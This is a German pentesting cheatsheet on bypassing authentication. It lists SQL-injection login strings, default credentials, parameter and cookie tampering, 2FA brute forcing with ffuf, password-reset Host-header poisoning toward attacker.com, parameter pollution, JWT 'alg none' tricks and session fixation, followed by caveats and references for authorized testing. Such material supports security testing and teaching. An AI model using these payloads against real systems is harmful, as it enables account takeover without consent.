# 🔐 Cheatsheet: Authentifizierung umgehen

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

## 🔍 Techniken zum Umgehen der Anmeldung

### SQL-Injection
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Standardzugangsdaten
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### Parametermanipulation
```http
# Benutzertyp ändern
user_type=admin
role=administrator
isAdmin=true
admin=1

# Verifizierung überspringen
verified=true
mfa_verified=true
```

---

## 🔑 2FA/MFA umgehen

### Antwortmanipulation
```http
# false in true ändern
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Manipulation des Statuscodes
```http
# Bei 401/403 versuchen, den Statuscode in 200 zu ändern
# Einen Proxy zum Ändern der Antwort verwenden
```

### Direkter Seitenaufruf
```http
# Nach der Anmeldung die 2FA-Seite überspringen
/login → /2fa → /dashboard
# Versuchen, /dashboard direkt aufzurufen
```

### Codes per Brute Force durchprobieren
```bash
# Vierstellige Codes
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Wiederverwendung von Codes
```http
# Versuchen, alte/abgelaufene Codes zu verwenden
# Versuchen, denselben Code mehrfach zu verwenden
```

### Null- und Leerwerte
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Passwortzurücksetzung umgehen

### Host-Header-Injection
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Tokenmanipulation
```http
# Vorhersagbare Tokens
token=1
token=admin
token=base64(user_id)

# Wiederverwendung von Tokens
# Eigenes Zurücksetzungstoken mit der E-Mail-Adresse des Opfers verwenden
```

### Parameter Pollution (mehrfach übergebene Parameter)
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Antwortmanipulation
```json
// Token in der Antwort suchen
{"token": "abc123", "email": "victim@target.com"}
```

---

## 🛡️ Sitzungs- und Cookie-Prüfungen umgehen

### Cookiemanipulation
```http
# Werte ändern
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### JWT-Manipulation
```json
// Claims (Tokenangaben) ändern
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Session Fixation (Fixierung einer Sitzungskennung)
```http
# Dem Opfer die Sitzung des Angreifers vorgeben
# Das Opfer meldet sich mit der Sitzungskennung des Angreifers an
```

---

## 📊 Kurzreferenz

| Umgangene Prüfung | Technik |
|-------------|-----------|
| Anmeldung | SQLi, Standardzugangsdaten |
| 2FA | Antwortmanipulation, Brute Force |
| Passwortzurücksetzung | Host-Header, Wiederverwendung von Tokens |
| Sitzung | Cookiemanipulation, JWT |

### Häufig anfällige Funktionen
```
- Anmeldeformulare
- Abläufe zur Passwortzurücksetzung
- 2FA/MFA-Implementierungen
- Funktionen zum dauerhaften Angemeldetbleiben (Remember me)
- Kontoverifizierung
- OAuth-Implementierungen
```

---

## 📚 Ressourcen

- [PortSwigger: Authentifizierung](https://portswigger.net/web-security/authentication)
- [HackTricks: Authentifizierung umgehen](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

## 📝 Ergänzende Hinweise zur Einordnung

- **Voraussetzungen und Nachweis:** Die Beispiele sind Prüfideen, keine allgemein wirksamen Umgehungen. Geänderte Rollenparameter oder Cookies helfen nur, wenn die Anwendung diesen Angaben vertraut. Ein lokal auf `200` geänderter Statuscode oder ein verändertes Antwortfeld belegt noch keinen serverseitigen Zugriff. Entscheidend ist, ob geschützte Funktionen ohne vollständig abgeschlossene Authentifizierung tatsächlich verfügbar sind. [OWASP: Umgehung der Authentifizierung](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema/), [PortSwigger: MFA-Schwachstellen](https://portswigger.net/web-security/authentication/multi-factor).
- **Brute-Force-Beispiel:** Der gezeigte Aufruf ist ein verkürztes Shell-Beispiel. Die Prozesssubstitution setzt eine passende Shell voraus; reale Abläufe benötigen außerdem den passenden Sitzungskontext und gegebenenfalls weitere Formularfelder. Beim POST-Fuzzing zeigt die ffuf-Dokumentation einen zur Nutzlast passenden Content-Type. Die Wirkung hängt zudem von Rate Limits und der Gültigkeit der Codes ab. [ffuf: POST data fuzzing](https://github.com/ffuf/ffuf#post-data-fuzzing), [PortSwigger: MFA-Schwachstellen](https://portswigger.net/web-security/authentication/multi-factor).
- **Passwortzurücksetzung:** Host-Header-Manipulation ist nur relevant, wenn die Anwendung daraus einen beeinflussbaren Zurücksetzungslink erzeugt; der Request allein beweist noch keinen Tokenverlust. Ein Token muss sicher an das betreffende Konto gebunden sein. [PortSwigger: Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).
- **JWT:** `alg` gehört in den JWT-Header, während etwa `role` ein Claim in der Payload ist. Die JSON-Zeilen zeigen Ausschnitte, keine vollständigen Tokens. Änderungen an signierten Inhalten machen die Signatur ungültig; eine Umgehung setzt eine fehlerhafte Verifikation voraus. `none` kennzeichnet ein unsigniertes JWT und wird von sicheren Implementierungen abgelehnt. [PortSwigger: JWT-Angriffe](https://portswigger.net/web-security/jwt).
- **Session Fixation:** Voraussetzung ist, dass das Opfer eine dem Angreifer bekannte Sitzungskennung verwendet und die Anwendung sie beim Anmelden nicht wirksam ersetzt. [OWASP: Session Fixation](https://owasp.org/www-community/attacks/Session_fixation).

---

<p align="center">
  <b>🔐 Authentifizierung auf Schwachstellen prüfen!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>
